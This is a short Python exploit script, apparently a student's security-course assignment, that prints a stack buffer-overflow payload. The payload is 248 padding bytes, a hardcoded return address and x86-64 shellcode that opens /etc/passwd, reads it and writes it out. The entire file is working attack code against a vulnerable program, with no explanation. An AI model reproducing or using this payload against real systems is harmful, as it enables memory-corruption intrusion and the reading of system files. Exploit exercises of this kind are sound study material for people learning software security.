# malicious_input-5_2.py
# I pledge my honor that I have abided by the Stevens Honor System.
# Justin Ho

import sys

sc = b"\x31\xc0\x04\x02\x31\xf6\x31\xd2\x48\x8d\x3d\x45\x44\x44\x44\x48\x81\xef\x01\x44\x44\x44\x4d\x31\xc0\x49\x83\xc0\x08\x42\x89\x54\x07\x03\x0f\x05\x41\x89\xc0\x48\xff\xcc\x48\x89\xe6\x31\xd2\xfe\xc2\x48\x31\xff\x4c\x89\xc7\x31\xc0\x0f\x05\x85\xc0\x74\x0e\x31\xc0\x31\xc0\xff\xc0\x31\xff\xff\xc7\x0f\x05\xeb\xe4\x04\x3c\x31\xff\x0f\x05\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"

sc_addr = b"\x60\xc1\xff\xff\xff\x7f\x00\x00"

exploit = 248 * b'A' + sc_addr
exploit += sc

sys.stdout.write(exploit)
